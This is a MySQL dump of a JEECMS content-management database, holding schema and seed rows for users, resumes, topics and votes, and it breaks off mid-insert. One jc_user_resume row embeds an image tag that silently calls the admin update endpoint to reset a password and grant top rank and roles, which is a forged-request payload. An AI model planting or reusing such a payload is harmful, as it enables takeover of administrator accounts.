UNLOCK TABLES;

--
-- Table structure for table `jc_site_txt`
--

DROP TABLE IF EXISTS `jc_site_txt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_txt` (
  `site_id` int(11) NOT NULL,
  `txt_name` varchar(30) NOT NULL COMMENT '名称',
  `txt_value` longtext COMMENT '值',
  KEY `fk_jc_txt_site` (`site_id`),
  CONSTRAINT `fk_jc_txt_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS站点文本表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_txt`
--

LOCK TABLES `jc_site_txt` WRITE;
/*!40000 ALTER TABLE `jc_site_txt` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_site_txt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_task`
--

DROP TABLE IF EXISTS `jc_task`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_task` (
  `task_id` int(11) NOT NULL AUTO_INCREMENT,
  `task_code` varchar(255) DEFAULT NULL COMMENT '任务执行代码',
  `task_type` tinyint(1) NOT NULL DEFAULT '0' COMMENT '任务类型(1首页静态化、2栏目页静态化、3内容页静态化、4采集、5分发)',
  `task_name` varchar(255) NOT NULL COMMENT '任务名称',
  `job_class` varchar(255) NOT NULL COMMENT '任务类',
  `execycle` tinyint(1) NOT NULL DEFAULT '1' COMMENT '执行周期分类(1非表达式 2 cron表达式)',
  `day_of_month` int(11) DEFAULT NULL COMMENT '每月的哪天',
  `day_of_week` tinyint(1) DEFAULT NULL COMMENT '周几',
  `hour` int(11) DEFAULT NULL COMMENT '小时',
  `minute` int(11) DEFAULT NULL COMMENT '分钟',
  `interval_hour` int(11) DEFAULT NULL COMMENT '间隔小时',
  `interval_minute` int(11) DEFAULT NULL COMMENT '间隔分钟',
  `task_interval_unit` tinyint(1) DEFAULT NULL COMMENT '1分钟、2小时、3日、4周、5月',
  `cron_expression` varchar(255) DEFAULT NULL COMMENT '规则表达式',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  `task_remark` varchar(255) DEFAULT NULL COMMENT '任务说明',
  `site_id` int(11) NOT NULL COMMENT '站点',
  `user_id` int(11) NOT NULL COMMENT '创建者',
  `create_time` datetime NOT NULL COMMENT '创建时间',
  PRIMARY KEY (`task_id`),
  KEY `fk_jc_task_site` (`site_id`),
  CONSTRAINT `fk_jc_task_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='任务表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_task`
--

LOCK TABLES `jc_task` WRITE;
/*!40000 ALTER TABLE `jc_task` DISABLE KEYS */;
INSERT INTO `jc_task` VALUES (3,'3d648c5b-3815-4e34-9a90-888c02d54e6e',1,'11','com.jeecms.cms.task.job.IndexStaticJob',1,NULL,NULL,NULL,NULL,NULL,1,1,NULL,0,'',1,1,'2016-06-25 10:40:07');
/*!40000 ALTER TABLE `jc_task` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_task_attr`
--

DROP TABLE IF EXISTS `jc_task_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_task_attr` (
  `task_id` int(11) NOT NULL,
  `param_name` varchar(30) NOT NULL COMMENT '参数名称',
  `param_value` varchar(255) DEFAULT NULL COMMENT '参数值',
  KEY `fk_jc_attr_task` (`task_id`),
  CONSTRAINT `fk_jc_attr_task` FOREIGN KEY (`task_id`) REFERENCES `jc_task` (`task_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='任务参数表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_task_attr`
--

LOCK TABLES `jc_task_attr` WRITE;
/*!40000 ALTER TABLE `jc_task_attr` DISABLE KEYS */;
INSERT INTO `jc_task_attr` VALUES (3,'site_id','1');
/*!40000 ALTER TABLE `jc_task_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_third_account`
--

DROP TABLE IF EXISTS `jc_third_account`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_third_account` (
  `account_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `account_key` varchar(255) NOT NULL DEFAULT '' COMMENT '第三方账号key',
  `username` varchar(100) NOT NULL DEFAULT '0' COMMENT '关联用户名',
  `source` varchar(10) NOT NULL DEFAULT '' COMMENT '第三方账号平台(QQ、新浪微博等)',
  PRIMARY KEY (`account_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='第三方登录平台账号';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_third_account`
--

LOCK TABLES `jc_third_account` WRITE;
/*!40000 ALTER TABLE `jc_third_account` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_third_account` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_topic`
--

DROP TABLE IF EXISTS `jc_topic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_topic` (
  `topic_id` int(11) NOT NULL AUTO_INCREMENT,
  `channel_id` int(11) DEFAULT NULL,
  `topic_name` varchar(150) NOT NULL COMMENT '名称',
  `short_name` varchar(150) DEFAULT NULL COMMENT '简称',
  `keywords` varchar(255) DEFAULT NULL COMMENT '关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `title_img` varchar(100) DEFAULT NULL COMMENT '标题图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '专题模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推??',
  PRIMARY KEY (`topic_id`),
  KEY `fk_jc_topic_channel` (`channel_id`),
  CONSTRAINT `fk_jc_topic_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='CMS专题表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_topic`
--

LOCK TABLES `jc_topic` WRITE;
/*!40000 ALTER TABLE `jc_topic` DISABLE KEYS */;
INSERT INTO `jc_topic` VALUES (1,NULL,' 2016饲料英才网络招聘会','饲料英才网络招聘会','','','/u/cms/www/201610/10100951y2xy.jpg','/u/cms/www/201610/11092540p27t.jpg','',11,1),(2,NULL,'互联网+与传统产业升级之道','互联网+','','','/u/cms/www/201610/10100842hqdk.jpg','/u/cms/www/201610/110911592mxa.jpg','',10,1),(3,NULL,'2015全国两会','2015全国两会','','','/u/cms/www/201610/101010021q7v.jpg','/u/cms/www/201610/11092148co74.jpg','',10,1);
/*!40000 ALTER TABLE `jc_topic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_topic_channel`
--

DROP TABLE IF EXISTS `jc_topic_channel`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_topic_channel` (
  `topic_id` int(11) NOT NULL,
  `channel_id` int(11) NOT NULL,
  PRIMARY KEY (`topic_id`,`channel_id`),
  KEY `fk_jc_topic_channel_channel` (`channel_id`),
  KEY `fk_jc_topic_channel_topic` (`topic_id`),
  CONSTRAINT `fk_jc_topic_channel_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`),
  CONSTRAINT `fk_jc_topic_channel_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_topic_channel`
--

LOCK TABLES `jc_topic_channel` WRITE;
/*!40000 ALTER TABLE `jc_topic_channel` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_topic_channel` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user`
--

DROP TABLE IF EXISTS `jc_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user` (
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `email` varchar(100) DEFAULT NULL COMMENT '邮箱',
  `register_time` datetime NOT NULL COMMENT '注册时间',
  `register_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '注册IP',
  `last_login_time` datetime NOT NULL COMMENT '最后登录时间',
  `last_login_ip` varchar(50) NOT NULL DEFAULT '127.0.0.1' COMMENT '最后登录IP',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登录次数',
  `rank` int(11) NOT NULL DEFAULT '0' COMMENT '管理员级别',
  `upload_total` bigint(20) NOT NULL DEFAULT '0' COMMENT '上传总大小',
  `upload_size` int(11) NOT NULL DEFAULT '0' COMMENT '上传大小',
  `upload_date` date DEFAULT NULL COMMENT '上传日期',
  `is_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否管理员',
  `is_self_admin` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否只管理自己的数据',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `session_id` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`user_id`),
  UNIQUE KEY `ak_username` (`username`),
  KEY `fk_jc_user_group` (`group_id`),
  CONSTRAINT `fk_jc_user_group` FOREIGN KEY (`group_id`) REFERENCES `jc_group` (`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user`
--

LOCK TABLES `jc_user` WRITE;
/*!40000 ALTER TABLE `jc_user` DISABLE KEYS */;
INSERT INTO `jc_user` VALUES (1,1,'admin','aa@qq.com','2011-01-03 00:00:00','127.0.0.1','2017-02-20 09:34:19','127.0.0.1',2285,9,334182,18,'2016-10-13',1,0,0,'BBF111F4FA297054648A753F99492ED5');
/*!40000 ALTER TABLE `jc_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_account`
--

DROP TABLE IF EXISTS `jc_user_account`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_account` (
  `user_id` int(11) NOT NULL,
  `account_weixin` varchar(255) DEFAULT NULL COMMENT '微信账号名',
  `account_weixin_openId` varchar(255) DEFAULT NULL COMMENT '微信账号openid',
  `account_alipy` varchar(255) DEFAULT NULL COMMENT '支付宝账号',
  `draw_account` tinyint(1) NOT NULL DEFAULT '0' COMMENT '提现账户(0微信 1支付宝)',
  `content_total_amount` double(15,4) DEFAULT '0.0000' COMMENT '稿费总金额',
  `content_no_pay_amount` double(15,4) DEFAULT '0.0000' COMMENT '待提现稿费金额',
  `content_year_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费年金额',
  `content_month_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本月金额',
  `content_day_amount` double(15,4) NOT NULL DEFAULT '0.0000' COMMENT '稿费本日金额',
  `content_buy_count` int(11) DEFAULT NULL COMMENT '被用户购买次数',
  `draw_count` int(11) DEFAULT '0' COMMENT '累计提现次数',
  `last_draw_time` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '上次提现时间',
  `last_buy_time` timestamp NULL DEFAULT NULL COMMENT '上次用户购买时间',
  PRIMARY KEY (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户稿费收费配置';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_account`
--

LOCK TABLES `jc_user_account` WRITE;
/*!40000 ALTER TABLE `jc_user_account` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_user_account` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_attr`
--

DROP TABLE IF EXISTS `jc_user_attr`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_attr` (
  `user_id` int(11) NOT NULL,
  `attr_name` varchar(255) NOT NULL,
  `attr_value` varchar(255) DEFAULT NULL,
  KEY `fk_jc_attr_user` (`user_id`),
  CONSTRAINT `fk_jc_attr_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户属性表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_attr`
--

LOCK TABLES `jc_user_attr` WRITE;
/*!40000 ALTER TABLE `jc_user_attr` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_user_attr` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_collection`
--

DROP TABLE IF EXISTS `jc_user_collection`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_collection` (
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '用户id',
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '内容id',
  PRIMARY KEY (`user_id`,`content_id`),
  KEY `fk_jc_user_collection_con` (`content_id`),
  CONSTRAINT `fk_jc_user_collection_con` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_user_collection_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户收藏关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_collection`
--

LOCK TABLES `jc_user_collection` WRITE;
/*!40000 ALTER TABLE `jc_user_collection` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_user_collection` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_ext`
--

DROP TABLE IF EXISTS `jc_user_ext`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_ext` (
  `user_id` int(11) NOT NULL,
  `realname` varchar(100) DEFAULT NULL COMMENT '真实姓名',
  `gender` tinyint(1) DEFAULT NULL COMMENT '性别',
  `birthday` datetime DEFAULT NULL COMMENT '出生日期',
  `intro` varchar(255) DEFAULT NULL COMMENT '个人介绍',
  `comefrom` varchar(150) DEFAULT NULL COMMENT '来自',
  `qq` varchar(100) DEFAULT NULL COMMENT 'QQ',
  `msn` varchar(100) DEFAULT NULL COMMENT 'MSN',
  `phone` varchar(50) DEFAULT NULL COMMENT '电话',
  `mobile` varchar(50) DEFAULT NULL COMMENT '手机',
  `user_img` varchar(255) DEFAULT NULL COMMENT '用户头像',
  `user_signature` varchar(255) DEFAULT NULL COMMENT '用户个性签名',
  PRIMARY KEY (`user_id`),
  CONSTRAINT `fk_jc_ext_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户扩展信息表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_ext`
--

LOCK TABLES `jc_user_ext` WRITE;
/*!40000 ALTER TABLE `jc_user_ext` DISABLE KEYS */;
INSERT INTO `jc_user_ext` VALUES (1,'JEECMS',1,'2015-04-09 00:00:00',NULL,'南昌',NULL,NULL,'1110999','121212','/user/images/201609/191017527cv9.jpg','');
/*!40000 ALTER TABLE `jc_user_ext` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_menu`
--

DROP TABLE IF EXISTS `jc_user_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_menu` (
  `menu_id` int(11) NOT NULL AUTO_INCREMENT,
  `menu_name` varchar(255) NOT NULL COMMENT '菜单名称',
  `menu_url` varchar(255) NOT NULL COMMENT '菜单地址',
  `priority` int(11) NOT NULL DEFAULT '10',
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`menu_id`),
  KEY `fk_jc_menu_user` (`user_id`),
  CONSTRAINT `fk_jc_menu_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户常用菜单';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_menu`
--

LOCK TABLES `jc_user_menu` WRITE;
/*!40000 ALTER TABLE `jc_user_menu` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_user_menu` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_resume`
--

DROP TABLE IF EXISTS `jc_user_resume`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_resume` (
  `user_id` int(11) NOT NULL,
  `resume_name` varchar(255) NOT NULL COMMENT '简历名称',
  `target_worknature` varchar(255) DEFAULT NULL COMMENT '期望工作性质',
  `target_workplace` varchar(255) DEFAULT NULL COMMENT '期望工作地点',
  `target_category` varchar(255) DEFAULT NULL COMMENT '期望职位类别',
  `target_salary` varchar(255) DEFAULT NULL COMMENT '期望月薪',
  `edu_school` varchar(255) DEFAULT NULL COMMENT '毕业学校',
  `edu_graduation` datetime DEFAULT NULL COMMENT '毕业时间',
  `edu_back` varchar(255) DEFAULT NULL COMMENT '学历',
  `edu_discipline` varchar(255) DEFAULT NULL COMMENT '专业',
  `recent_company` varchar(500) DEFAULT NULL COMMENT '最近工作公司名称',
  `company_industry` varchar(255) DEFAULT NULL COMMENT '最近公司所属行业',
  `company_scale` varchar(255) DEFAULT NULL COMMENT '公司规模',
  `job_name` varchar(255) DEFAULT NULL COMMENT '职位名称',
  `job_category` varchar(255) DEFAULT NULL COMMENT '职位类别',
  `job_start` datetime DEFAULT NULL COMMENT '工作起始时间',
  `subordinates` varchar(255) DEFAULT NULL COMMENT '下属人数',
  `job_description` text COMMENT '工作描述',
  `self_evaluation` varchar(2000) DEFAULT NULL COMMENT '自我评价',
  PRIMARY KEY (`user_id`),
  CONSTRAINT `fk_jc_resume_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='用户简历';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_resume`
--

LOCK TABLES `jc_user_resume` WRITE;
/*!40000 ALTER TABLE `jc_user_resume` DISABLE KEYS */;
INSERT INTO `jc_user_resume` VALUES (1,'程序员','','','','','家里蹲大学',NULL,'','吃饭','<img src=/jeeadmin/jeecms/admin_global/o_update.do?password=111&groupId=1&rank=9&roleIds=1&siteIds=1&steps=2&allChannels=true&id=1＞',NULL,NULL,'11',NULL,NULL,NULL,'111\r\n222222222222222222222222222\r\n3333333333333333333333333333333333\r\n44444444444444444444444444444444444444444\r\n55555555555555555555555555555555555','我很强大的哦');
/*!40000 ALTER TABLE `jc_user_resume` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_role`
--

DROP TABLE IF EXISTS `jc_user_role`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_role` (
  `role_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`role_id`,`user_id`),
  KEY `fk_jc_role_user` (`user_id`),
  CONSTRAINT `fk_jc_role_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_role` FOREIGN KEY (`role_id`) REFERENCES `jc_role` (`role_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS用户角色关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_role`
--

LOCK TABLES `jc_user_role` WRITE;
/*!40000 ALTER TABLE `jc_user_role` DISABLE KEYS */;
INSERT INTO `jc_user_role` VALUES (1,1);
/*!40000 ALTER TABLE `jc_user_role` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_user_site`
--

DROP TABLE IF EXISTS `jc_user_site`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_user_site` (
  `usersite_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `site_id` int(11) NOT NULL,
  `check_step` tinyint(4) NOT NULL DEFAULT '1' COMMENT '审核级别',
  `is_all_channel` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否拥有所有栏目的权限',
  PRIMARY KEY (`usersite_id`),
  KEY `fk_jc_site_user` (`user_id`),
  KEY `fk_jc_user_site` (`site_id`),
  CONSTRAINT `fk_jc_site_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_user_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS管理员站点表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_user_site`
--

LOCK TABLES `jc_user_site` WRITE;
/*!40000 ALTER TABLE `jc_user_site` DISABLE KEYS */;
INSERT INTO `jc_user_site` VALUES (2,1,1,3,1);
/*!40000 ALTER TABLE `jc_user_site` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_vote_item`
--

DROP TABLE IF EXISTS `jc_vote_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_vote_item` (
  `voteitem_id` int(11) NOT NULL AUTO_INCREMENT,
  `votetopic_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `vote_count` int(11) NOT NULL DEFAULT '0' COMMENT '投票数量',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `subtopic_id` int(11) DEFAULT NULL,
  `picture` varchar(255) DEFAULT NULL COMMENT '图片',
  PRIMARY KEY (`voteitem_id`),
  KEY `fk_jc_vote_item_topic` (`votetopic_id`),
  KEY `FK_jc_vote_item_subtopic` (`subtopic_id`),
  CONSTRAINT `FK_jc_vote_item_subtopic` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`),
  CONSTRAINT `fk_jc_vote_item_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8 COMMENT='CMS投票项';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_vote_item`
--

LOCK TABLES `jc_vote_item` WRITE;
/*!40000 ALTER TABLE `jc_vote_item` DISABLE KEYS */;
INSERT INTO `jc_vote_item` VALUES (12,2,'很喜欢',74,1,13,''),(13,2,'不喜欢',0,3,13,''),(14,2,'喜欢',3,2,13,''),(15,2,'差不多',0,6,15,''),(16,2,'没有改进',0,7,15,''),(17,2,'改进很大',81,4,15,''),(18,2,'有改进',3,5,15,''),(19,2,'图库',76,9,16,''),(20,2,'新闻',80,8,16,''),(21,2,'下载',72,11,16,''),(22,2,'视频',72,10,16,''),(26,3,'5000',0,2,18,''),(27,3,'10000',1,3,18,''),(28,3,'3000',0,1,18,''),(33,4,'4号',0,4,20,''),(34,4,'2号',0,2,20,''),(35,4,'1号',0,1,20,''),(36,4,'3号',0,3,20,''),(37,5,'1号',0,1,21,''),(38,5,'2号',0,2,21,''),(39,5,'3号',0,3,21,''),(40,5,'4号',0,4,21,''),(41,6,'张',0,1,22,''),(42,6,'李',0,2,22,''),(43,6,'陈',0,3,22,''),(44,6,'王',0,4,22,''),(45,7,'赵',0,1,23,''),(46,7,'孙',0,2,23,''),(47,7,'姚',0,3,23,''),(48,7,'黄',0,4,23,''),(49,8,'钱',0,1,24,''),(50,8,'周',0,2,24,''),(51,8,'郑',0,3,24,''),(52,8,'胡',0,4,24,''),(53,9,'南大',0,1,25,''),(54,9,'财大',0,2,25,''),(55,9,'师大',0,3,25,''),(56,9,'农大',0,4,25,''),(57,10,'很尽兴',37,1,26,''),(58,10,'还行',0,2,26,''),(59,10,'没玩够',0,3,26,''),(60,10,'家里蹲',0,4,26,''),(61,11,'赞成',16,1,27,''),(62,11,'反对',0,2,27,''),(63,11,'对我不影响',0,3,27,'');
/*!40000 ALTER TABLE `jc_vote_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_vote_record`
--

DROP TABLE IF EXISTS `jc_vote_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_vote_record` (
  `voterecored_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `votetopic_id` int(11) NOT NULL,
  `vote_time` datetime NOT NULL COMMENT '投票时间',
  `vote_ip` varchar(50) NOT NULL COMMENT '投票IP',
  `vote_cookie` varchar(32) NOT NULL COMMENT '投票COOKIE',
  `wx_open_id` varchar(50) DEFAULT NULL COMMENT '微信投票者openId',
  PRIMARY KEY (`voterecored_id`),
  KEY `fk_jc_vote_record_topic` (`votetopic_id`),
  KEY `fk_jc_voterecord_user` (`user_id`),
  CONSTRAINT `fk_jc_vote_record_topic` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`),
  CONSTRAINT `fk_jc_voterecord_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=81 DEFAULT CHARSET=utf8 COMMENT='CMS投票记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_vote_record`
--

LOCK TABLES `jc_vote_record` WRITE;
/*!40000 ALTER TABLE `jc_vote_record` DISABLE KEYS */;
INSERT INTO `jc_vote_record` VALUES (1,NULL,3,'2016-09-30 14:57:46','117.40.115.55','85c62d7bc19b436dbb8dd21edc2ebfd5',NULL),(2,NULL,11,'2016-10-09 11:38:05','117.41.153.171','d2c045570d544b99885cb8f3fef658d2',NULL),(3,NULL,10,'2016-10-10 14:30:05','117.41.152.66','837d951f500c4671bd353d0d3ebadbfa',NULL),(4,NULL,11,'2016-10-10 14:30:05','117.41.152.66','fc848a92556a4c559f79f02ca04a9ffa',NULL),(5,NULL,11,'2016-10-10 16:00:55','117.41.152.66','0bf2c8f72d94473db38bd95ebaefcdfd',NULL),(8,NULL,11,'2016-10-10 16:00:56','117.41.152.66','b22d8d1d813f4bc2b4e4c665c4e615fa',NULL),(9,NULL,11,'2016-10-10 16:00:56','117.41.152.66','88db248d9fe147f6897671de3fb568f9',NULL),(12,NULL,11,'2016-10-10 16:00:56','117.41.152.66','465da02a13fc4f7fa2b72781d7bbf8e1',NULL),(14,NULL,11,'2016-10-10 16:00:56','117.41.152.66','c15529ef4ce245f781b64f7f2cb953bf',NULL),(17,NULL,10,'2016-10-10 16:00:56','117.41.152.66','1ea33a4323994d89b4bcc873116e93be',NULL),(19,NULL,11,'2016-10-10 16:00:57','117.41.152.66','4ad719ade7594ceaa1015e9bfc1b3f47',NULL),(20,NULL,11,'2016-10-10 16:00:57','117.41.152.66','ff7f622c3a1c4529894de76c523b553c',NULL),(21,NULL,11,'2016-10-10 16:00:57','117.41.152.66','36b4f3912f264a83b135486b34827d65',NULL),(22,NULL,10,'2016-10-10 16:00:57','117.41.152.66','901cb03ec75145eeaf60702c1e3064d5',NULL),(23,NULL,11,'2016-10-10 16:00:57','117.41.152.66','49b4dd1536e2467aad34d80bc1016efc',NULL),(24,NULL,10,'2016-10-10 16:00:57','117.41.152.66','3759152aa2fc4036b46eaf58c70ac6b5',NULL),(25,NULL,11,'2016-10-10 16:00:58','117.41.152.66','d8ae1822d8ad4203a88008815f15aa9b',NULL),(26,NULL,10,'2016-10-10 16:00:58','117.41.152.66','e60dbfc647f54d2b86dd36ee4b541fc6',NULL),(30,NULL,10,'2016-10-10 16:00:58','117.41.152.66','d78a0d8166be459b93a29b7d8c342371',NULL),(31,NULL,11,'2016-10-10 16:00:58','117.41.152.66','207ccc615b7a410e87bb51c39adcbe60',NULL),(32,NULL,10,'2016-10-10 16:00:58','117.41.152.66','bfc4dd4213424263a2790715649fecc9',NULL),(34,NULL,10,'2016-10-10 16:00:58','117.41.152.66','df5764ee8165497b82c550f66ff9d8a5',NULL),(35,NULL,11,'2016-10-10 16:00:59','117.41.152.66','962c03f30edb4cc4ba01e7397361bdc7',NULL),(36,NULL,10,'2016-10-10 16:00:59','117.41.152.66','101593c1b84d48638958b7503d2f3659',NULL),(38,NULL,10,'2016-10-10 16:00:59','117.41.152.66','8e3ea7a9bf4c442495f5a0ea05e31fd3',NULL),(40,NULL,10,'2016-10-10 16:00:59','117.41.152.66','d55e04b63a85415f82b9e101e65593e0',NULL),(41,NULL,10,'2016-10-10 16:00:59','117.41.152.66','a0fa6f6f3a8a49fab812cd7dc5e1a0f2',NULL),(43,NULL,10,'2016-10-10 